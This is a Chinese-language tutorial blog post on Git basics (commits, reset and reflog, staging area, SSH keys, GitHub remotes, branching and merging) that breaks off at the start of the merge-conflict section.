    <content><![CDATA[<p>Git是目前最流行的版本控制系统，因为其开源免费并且是分布式的，相比于集中式版本控制系统有其优越性<a id="more"></a>，学习它以便之后使用Github存放代码，之前还没怎么系统的学过，现在从头再来学一下，参考<a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">廖雪峰前辈的教程</a>。</p>
<p>Git安装完成之后先设置自己的用户名和邮箱</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure>

<p>这里的<code>--global</code>参数表示电脑上所有的Git仓库都使用这个配置</p>
<h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>版本库也叫仓库，英文repository，相当于电脑上一个文件夹，文件夹里的所有文件都能被Git管理，文件的修改、删除都能被Git追踪，以便追踪历史或者”还原”。</p>
<p>创建仓库：选择一个合适的地方创建一个空文件夹，然后在Git bash里执行命令<code>git init</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository in D:&#x2F;git&#x2F;test&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>

<p>初始化仓库之后会自动生成一个名为<code>.git</code>的隐藏文件夹，该文件夹是Git用来跟踪管理仓库的，不要乱改里面的内容，防止仓库被破坏。</p>
<h2 id="把文件添加到版本库"><a href="#把文件添加到版本库" class="headerlink" title="把文件添加到版本库"></a>把文件添加到版本库</h2><p>首先说明，所有的版本控制系统，只能跟踪文本文件的改动，比如txt文件、网页、所有的程序代码等等，而图片、视频这些二进制文件虽然也能管理，但是不能跟踪文件的具体变化。</p>
<p>我创建了一个readme.txt文件，内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure>

<p>把一个文件放到Git仓库只需要两步</p>
<p>第一步，用命令<code>git add</code>把文件添加到仓库</p>
<p><code>$ git add readme.txt</code></p>
<p>没有任何反应就对了，Unix的哲学就是没有消息就是好消息</p>
<p>第二步，用命令<code>git commit</code>把文件提交到仓库，这里可以加上<code>-m</code>参数输入本次提交的说明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;write a readme file&quot;</span><br><span class="line">[master (root-commit) 794d914] write a readme file</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 readme.TXT</span><br></pre></td></tr></table></figure>

<p>为什么Git添加文件需要<code>add</code>,<code>commit</code>两步呢，因为<code>commit</code>可以一次提交很多文件，所以可以多次<code>add</code>不同的文件后再一起提交，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add file1.txt</span><br><span class="line">$ git add file2.txt file3.txt</span><br><span class="line">$ git commit -m &quot;add 3 files&quot;</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>初始化一个Git仓库，使用<code>git init</code>命令。</p>
<p>添加文件到Git仓库，分两步：</p>
<ol>
<li>使用命令<code>git add &lt;file&gt;</code>，注意，可反复多次使用，添加多个文件；</li>
<li>使用命令<code>git commit -m &lt;message&gt;</code>，完成。</li>
</ol>
<h2 id="时光机穿梭"><a href="#时光机穿梭" class="headerlink" title="时光机穿梭"></a>时光机穿梭</h2><p>修改readme.txt文件，内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software.</span><br></pre></td></tr></table></figure>

<p>运行<code>git status</code>命令查看仓库当前的状态(有无修改)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line">        modified:   readme.TXT</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>

<p>上面输出表明<code>readme.txt</code>被修改过了，但是还没有提交</p>
<p><code>git diff</code>命令查看修改的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git diff readme.TXT</span><br><span class="line">diff --git a&#x2F;readme.TXT b&#x2F;readme.TXT</span><br><span class="line">index 95d09f2..013b5bc 100644</span><br><span class="line">--- a&#x2F;readme.TXT</span><br><span class="line">+++ b&#x2F;readme.TXT</span><br><span class="line">@@ -1 +1,2 @@</span><br><span class="line">-hello world</span><br><span class="line">\ No newline at end of file</span><br><span class="line">+Git is a distributed version control system.</span><br><span class="line">+Git is free software.</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>

<p>看到添加了新两行内容</p>
<p>知道做了什么修改后再提交就放心多了，提交修改同样是两步</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.TXT</span><br></pre></td></tr></table></figure>

<p>执行<code>git commit</code>之前，先运行<code>git status</code>看看当前仓库的状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git restore --staged &lt;file&gt;...&quot; to unstage)</span><br><span class="line">        modified:   readme.TXT</span><br></pre></td></tr></table></figure>

<p><code>git status</code>告诉了，将要被提交的修改有<code>readme.txt</code>,下一步放心提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add something&quot;</span><br><span class="line">[master 635034f] add something</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>提交后再用<code>git status</code>命令查看仓库状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>说明当前没有需要提交的修改，工作目录是干净的。</p>
<p>小结：</p>
<p>要随时掌握工作区的状态，使用<code>git status</code>命令。</p>
<p>如果<code>git status</code>告诉你有文件被修改过，用<code>git diff</code>可以查看修改内容。</p>
<h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><blockquote>
<p>不断对文件进行修改，然后不断提交修改到版本库里，就好比玩RPG游戏时，每通过一关就会自动把游戏状态存盘，如果某一关没过去，你还可以选择读取前一关的状态。有些时候，在打Boss之前，你会手动存盘，以便万一打Boss失败了，可以从最近的地方重新开始。Git也是一样，每当你觉得文件修改到一定程度的时候，就可以“保存一个快照”，这个快照在Git中被称为<code>commit</code>。一旦你把文件改乱了，或者误删了文件，还可以从最近的一个<code>commit</code>恢复，然后继续工作，而不是把几个月的工作成果全部丢失。</p>
</blockquote>
<p><code>git log</code>命令查看历史记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log</span><br><span class="line">commit 635034f7651b9b479276e2150fe82f8f6ddba5f1 (HEAD -&gt; master)</span><br><span class="line">Author: Tianzeee &lt;1252448508@qq.com&gt;</span><br><span class="line">Date:   Sat Mar 27 13:48:41 2021 +0800</span><br><span class="line"></span><br><span class="line">    add something</span><br><span class="line"></span><br><span class="line">commit 794d9141fcdece6633db01b9e34e55dc001f70d9</span><br><span class="line">Author: Tianzeee &lt;1252448508@qq.com&gt;</span><br><span class="line">Date:   Sat Mar 27 13:27:54 2021 +0800</span><br><span class="line"></span><br><span class="line">    write a readme file</span><br></pre></td></tr></table></figure>

<p>历史记录包括版本号、作者、时间、提交说明</p>
<p>如果嫌输出信息太多，看得眼花缭乱，可以加上<code>--pretty=oneline</code>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --pretty&#x3D;oneline</span><br><span class="line">635034f7651b9b479276e2150fe82f8f6ddba5f1 (HEAD -&gt; master) add something</span><br><span class="line">794d9141fcdece6633db01b9e34e55dc001f70d9 write a readme file</span><br></pre></td></tr></table></figure>

<p>版本回退首先要知道当前版本是哪个，在Git中，用<code>HEAD</code>表示当前版本，上一个版本是<code>HEAD^</code>,上上一个版本是<code>HEAD^^</code>，往前100个版本可以写成<code>HEAD~100</code></p>
<p>用<code>git reset</code>命令进行版本回退</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset --hard head^</span><br><span class="line">HEAD is now at 794d914 write a readme file</span><br></pre></td></tr></table></figure>

<p>版本回退后<code>readme.txt</code>文件内容也变为原来的<code>hello world</code>了</p>
<p>但是版本回退后，最新的那个版本已经看不到了，想再回到未来怎么办两个办法。</p>
<p>方法一：只要命令行窗口没关，可以往上找到那个最新的版本号进行恢复，版本号不用写全，前几位就可以了</p>
<p>方法二：如果你回退到了某个版本，关掉了电脑，第二天后悔了找不到新版本的<code>commit id</code>怎么办</p>
<p><code>git reflog</code>命令记录你的每一次命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reflog</span><br><span class="line">794d914 (HEAD -&gt; master) HEAD@&#123;0&#125;: reset: moving to head^</span><br><span class="line">635034f HEAD@&#123;1&#125;: commit: add something</span><br><span class="line">794d914 (HEAD -&gt; master) HEAD@&#123;2&#125;: commit (initial): write a readme file</span><br></pre></td></tr></table></figure>

<p>这样就能看到新版本的版本号进行恢复了。</p>
<p>小结</p>
<p><code>HEAD</code>指向的版本就是当前版本，因此，Git允许我们在版本的历史之间穿梭，使用命令<code>git reset --hard commit_id</code>。</p>
<p>穿梭前，用<code>git log</code>可以查看提交历史，以便确定要回退到哪个版本。</p>
<p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p>
<h3 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h3><p>Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念</p>
<p>工作区（Working Directory）</p>
<p>就是电脑里的某个文件夹，比如我的<code>test</code>文件夹就是一个工作区</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210327141823332.png" alt="image-20210327141823332"></p>
<p>版本库（Repository）</p>
<p>工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库。</p>
<p>Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329165319.jpeg" alt="git-repo"></p>
<p>我们把文件往Git版本库里添加的时候，是分两步执行的：</p>
<p>第一步是用<code>git add</code>把文件添加进去，实际上就是把文件修改添加到暂存区；</p>
<p>第二步是用<code>git commit</code>提交更改，实际上就是把暂存区的所有内容提交到当前分支。</p>
<p>因为我们创建Git版本库时，Git自动为我们创建了唯一一个<code>master</code>分支，所以，现在，<code>git commit</code>就是往<code>master</code>分支上提交更改。</p>
<p>可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/9JLH1605XWQ%5D88_$%7DPF$K_P.png" alt="img"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/RFE~U5@465QX0$J%7DB%7BJ$YOS.png" alt="img"></p>
<p>小结：</p>
<p>暂存区是Git非常重要的概念，弄明白了暂存区，就弄明白了Git的很多操作到底干了什么。</p>
<h3 id="管理修改"><a href="#管理修改" class="headerlink" title="管理修改"></a>管理修改</h3><p>为什么Git比其他版本控制系统设计得优秀，因为Git跟踪并管理的是修改，而非文件。</p>
<p>什么是修改？比如你新增了一行，这就是一个修改，删除了一行，也是一个修改，更改了某些字符，也是一个修改，删了一些又加了一些，也是一个修改，甚至创建一个新文件，也算一个修改。</p>
<p>用<code>git diff HEAD -- readme.txt</code>命令可以查看工作区和版本库里面最新版本的区别</p>
<p>小结：理解了Git是如何跟踪修改的，每次修改，如果不用<code>git add</code>到暂存区，那就不会加入到<code>commit</code>中。</p>
<h3 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h3><p>撤销修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -- file</span><br></pre></td></tr></table></figure>

<p>　　撤销对工作区的修改，以最新一次的时间节点（add或者commit）为准，这个命令只改变工作区内容</p>
<p>清空暂存区修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset HEAD -- file</span><br></pre></td></tr></table></figure>

<p>　　清空add命令向暂存区提交的修改，该操作只影响暂存区，对工作区无影响。</p>
<p>版本回退：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD</span><br></pre></td></tr></table></figure>

<p>​    这个命令用于版本回退，就是将已提交的版本覆盖本地工作区的内容。该操作会清空暂存区的内容</p>
<p>小结：</p>
<p>场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令<code>git checkout -- file</code>。</p>
<p>场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了场景1，第二步按场景1操作。</p>
<p>场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</p>
<h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rm &lt;file&gt;</span><br><span class="line">gir commit -m &quot;xxx&quot;</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>命令<code>git rm</code>用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容。</p>
<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>由于你的本地Git仓库和GitHub仓库之间的传输是通过SSH加密的，所以，需要一点设置：</p>
<p>第1步：创建SSH Key。在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</span><br></pre></td></tr></table></figure>

<p>你需要把邮件地址换成你自己的邮件地址，然后一路回车，使用默认值即可，由于这个Key也不是用于军事目的，所以也无需设置密码。</p>
<p>如果一切顺利的话，可以在用户主目录里找到<code>.ssh</code>目录，里面有<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件，这两个就是SSH Key的秘钥对，<code>id_rsa</code>是私钥，不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p>
<p>第2步：登陆GitHub，打开“Account settings”，“SSH Keys”页面，然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容，点“Add Key”，你就应该看到已经添加的Key即可。</p>
<p>为什么GitHub需要SSH Key呢？因为GitHub需要识别出你推送的提交确实是你推送的，而不是别人冒充的，而Git支持SSH协议，所以，GitHub只要知道了你的公钥，就可以确认只有你自己才能推送。</p>
<p>当然，GitHub允许你添加多个Key。假定你有若干电脑，你一会儿在公司提交，一会儿在家里提交，只要把每台电脑的Key都添加到GitHub，就可以在每台电脑上往GitHub推送了。</p>
<p>最后友情提示，在GitHub上免费托管的Git仓库，任何人都可以看到喔（但只有你自己才能改）。所以，不要把敏感信息放进去。</p>
<p>如果你不想让别人看到Git库，有两个办法，一个是交点保护费，让GitHub把公开的仓库变成私有的，这样别人就看不见了（不可读更不可写）。另一个办法是自己动手，搭一个Git服务器，因为是你自己的Git服务器，所以别人也是看不见的。这个方法我们后面会讲到的，相当简单，公司内部开发必备。</p>
<h3 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h3><p>已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。</p>
<p>先在Github新建一个仓库(new repository),然后填写仓库名和描述</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210327221534084.png" alt="image-20210327221534084"></p>
<p>我创建了一个<code>test</code>仓库，目前，在GitHub上的这个<code>test</code>仓库还是空的，GitHub告诉我们，可以从这个仓库克隆出新的仓库，也可以把一个已有的本地仓库与之关联，然后，把本地仓库的内容推送到GitHub仓库。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210327221743178.png" alt="image-20210327221743178"></p>
<p>在本地的<code>test</code>仓库下运行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:Tianzeee&#x2F;test.git</span><br></pre></td></tr></table></figure>

<p>添加后，远程库的名字就是<code>origin</code>，这是Git默认的叫法，也可以改成别的，但是<code>origin</code>这个名字一看就知道是远程库。</p>
<p>下一步，就可以把本地库的所有内容推送到远程库上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p>
<p>之后再推送就不用加<code>-u</code>参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<p>把本地<code>master</code>分支的最新修改推送至GitHub</p>
<p>如果添加的时候地址写错了，或者就是想删除远程库，可以用<code>git remote rm &lt;name&gt;</code>命令。使用前，建议先用<code>git remote -v</code>查看远程库信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:Tianzeee&#x2F;test.git (fetch)</span><br><span class="line">origin  git@github.com:Tianzeee&#x2F;test.git (push)</span><br></pre></td></tr></table></figure>

<p>然后，根据名字删除，比如删除<code>origin</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure>

<p>此处的“删除”其实是解除了本地和远程的绑定关系，并不是物理上删除了远程库。远程库本身并没有任何改动。要真正删除远程库，需要登录到GitHub，在后台页面找到删除按钮再删除。</p>
<p>小结：</p>
<p>要关联一个远程库，使用命令<code>git remote add origin git@server-name:path/repo-name.git</code>；</p>
<p>关联一个远程库时必须给远程库指定一个名字，<code>origin</code>是默认习惯命名；</p>
<p>关联后，使用命令<code>git push -u origin master</code>第一次推送master分支的所有内容；</p>
<p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改；</p>
<p>分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在，也就是有没有联网都可以正常工作，而SVN在没有联网的时候是拒绝干活的！当有网络的时候，再把本地提交推送一下就完成了同步，真是太方便了！</p>
<h3 id="从远程库克隆"><a href="#从远程库克隆" class="headerlink" title="从远程库克隆"></a>从远程库克隆</h3><p>上面讲了先有本地库，后有远程库的时候，如何关联远程库。</p>
<p>现在，假设我们从零开发，那么最好的方式是先创建远程库，然后，从远程库克隆。</p>
<p>只需在Github创建一个新的仓库，然后勾选<code>Initialize this repository with a README</code>，这样GitHub会自动为我们创建一个<code>README.md</code>文件。创建完毕后，可以看到<code>README.md</code>文件</p>
<p>然后用<code>git clone</code>命令克隆到本地，如果有多个人协作开发，那么每个人各自从远程克隆一份就可以了。</p>
<p>GitHub给出的地址不止一个，还可以用<code>https://github.com/michaelliao/gitskills.git</code>这样的地址。实际上，Git支持多种协议，默认的<code>git://</code>使用ssh，但也可以使用<code>https</code>等其他协议。</p>
<p>使用<code>https</code>除了速度慢以外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放http端口的公司内部就无法使用<code>ssh</code>协议而只能用<code>https</code>。</p>
<p>小结：</p>
<p>要克隆一个仓库，首先必须知道仓库的地址，然后使用<code>git clone</code>命令克隆。</p>
<p>Git支持多种协议，包括<code>https</code>，但<code>ssh</code>协议速度最快。</p>
<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><blockquote>
<p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p>
<p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p>
<p>其他版本控制系统如SVN等都有分支管理，但是用过之后你会发现，这些版本控制系统创建和切换分支比蜗牛还慢，简直让人无法忍受，结果分支功能成了摆设，大家都不去用。</p>
<p>但Git的分支是与众不同的，无论创建、切换和删除分支，Git在1秒钟之内就能完成！无论你的版本库是1个文件还是1万个文件。</p>
</blockquote>
<h3 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h3><p>一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329131903.png" alt="git-br-initial"></p>
<p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p>
<p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329132112.png" alt="git-br-create"></p>
<p>Git创建一个分支很快，因为除了增加一个<code>dev</code>指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化</p>
<p>创建新的分支后对工作区的修改和提交就是针对<code>dev</code>分支了，比如新提交一次后，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329132303.png" alt="git-br-dev-fd"></p>
<p>在<code>dev</code>上的工作完成了，就可以把<code>dev</code>合并到<code>master</code>上。Git怎么合并，最简单的方法，就是直接把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329132553.png" alt="git-br-ff-merge"></p>
<p>所以Git合并分支也很快！就改改指针，工作区内容也不变！</p>
<p>合并完分支后，甚至可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后就剩下了一条<code>master</code>分支：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329132640.png" alt="git-br-rm"></p>
<p>创建<code>dev</code>分支，然后切换到<code>dev</code>分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev</span><br><span class="line">Switched to a new branch &#39;dev&#39;</span><br></pre></td></tr></table></figure>

<p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch dev</span><br><span class="line">$ git checkout dev</span><br><span class="line">Switched to branch &#39;dev&#39;</span><br></pre></td></tr></table></figure>

<p>用<code>git branch</code>命令查看当前分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br></pre></td></tr></table></figure>

<p><code>git branch</code>命令会列出所有分支，当前分支前面会标一个<code>*</code>号。</p>
<p>然后就可以在<code>dev</code>分支上正常提交，比如对<code>readme.txt</code>做个修改，加上一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create a new branch is quick</span><br></pre></td></tr></table></figure>

<p>然后提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.TXT</span><br><span class="line">$ git commit -m &quot;new branch&quot;</span><br><span class="line">[dev b987052] new branch</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p><code>dev</code>分支的工作完成，我们就可以切换回<code>master</code>分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &#39;master&#39;</span><br><span class="line">Your branch is up to date with &#39;origin&#x2F;master&#39;.</span><br></pre></td></tr></table></figure>

<p>切换回<code>master</code>分支后，再查看一个<code>readme.txt</code>文件，刚才添加的内容不见了！因为那个提交是在<code>dev</code>分支上，而<code>master</code>分支此刻的提交点并没有变：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329135528.png" alt="git-br-on-master"></p>
<p>把<code>dev</code>分支的工作成果合并到<code>master</code>分支上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge dev</span><br><span class="line">Updating 62b1052..b987052</span><br><span class="line">Fast-forward</span><br><span class="line"> readme.TXT | 3 ++-</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p><code>git merge</code>命令用于合并指定分支到当前分支。合并后，再查看<code>readme.txt</code>的内容，就可以看到，和<code>dev</code>分支的最新提交是完全一样的。上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。当然，也不是每次合并都能<code>Fast-forward</code>,还有其他方式的合并。</p>
<p>合并完成后，就可以放心地删除<code>dev</code>分支了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d dev</span><br><span class="line">Deleted branch dev (was b987052).</span><br></pre></td></tr></table></figure>

<p>删除后，查看<code>branch</code>，就只剩下<code>master</code>分支了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure>

<p>因为创建、合并和删除分支非常快，所以Git鼓励使用分支完成某个任务，合并后再删掉分支，这和直接在<code>master</code>分支上工作效果是一样的，但过程更安全。</p>
<p>switch:</p>
<p>切换分支使用<code>git checkout &lt;branch&gt;</code>，而前面讲过的撤销修改则是<code>git checkout -- &lt;file&gt;</code>，同一个命令，有两种作用。</p>
<p>实际上，切换分支这个动作，用<code>switch</code>更科学。因此，最新版本的Git提供了新的<code>git switch</code>命令来切换分支：</p>
<p>创建并切换到新的<code>dev</code>分支，可以使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git switch -c dev</span><br></pre></td></tr></table></figure>

<p>直接切换到已有的<code>master</code>分支，可以使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git switch master</span><br></pre></td></tr></table></figure>

<p>使用新的<code>git switch</code>命令，比<code>git checkout</code>要更容易理解。</p>
<p>小结：</p>
<p>Git鼓励大量使用分支：</p>
<p>查看分支：<code>git branch</code></p>
<p>创建分支：<code>git branch &lt;name&gt;</code></p>
<p>切换分支：<code>git checkout &lt;name&gt;</code>或者<code>git switch &lt;name&gt;</code></p>
<p>创建+切换分支：<code>git checkout -b &lt;name&gt;</code>或者<code>git switch -c &lt;name&gt;</code></p>
<p>合并某分支到当前分支：<code>git merge &lt;name&gt;</code></p>
<p>删除分支：<code>git branch -d &lt;name&gt;</code></p>
<h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>合并分支往往也不是一帆风顺的</p>
<p>准备新的<code>feature1</code>分支，继续我们的新分支开发：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch -c feature1</span><br><span class="line">Switched to a new branch &#39;feature1&#39;</span><br></pre></td></tr></table></figure>

<p>修改<code>readme.txt</code>最后一行，改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create a new branch is quick and simple</span><br></pre></td></tr></table></figure>

<p>在<code>feature1</code>分支上提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.TXT</span><br><span class="line">$ git commit -m &quot;and simple&quot;</span><br><span class="line">[feature1 ed139c7] and simple</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>切换到<code>master</code>分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch master</span><br><span class="line">Switched to branch &#39;master&#39;</span><br><span class="line">Your branch is ahead of &#39;origin&#x2F;master&#39; by 1 commit.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br></pre></td></tr></table></figure>

<p>Git还会自动提示我们当前<code>master</code>分支比远程的<code>master</code>分支要超前1个提交。</p>
<p>在<code>master</code>分支上把<code>readme.txt</code>文件的最后一行改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create a new branch is quick &amp; simple</span><br></pre></td></tr></table></figure>

<p>提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.TXT</span><br><span class="line">$ git commit -m &quot;&amp; simple&quot;</span><br><span class="line">[master 2e6e1d3] &amp; simple</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>现在，<code>master</code>分支和<code>feature1</code>分支各自都分别有新的提交，变成了这样：</p>
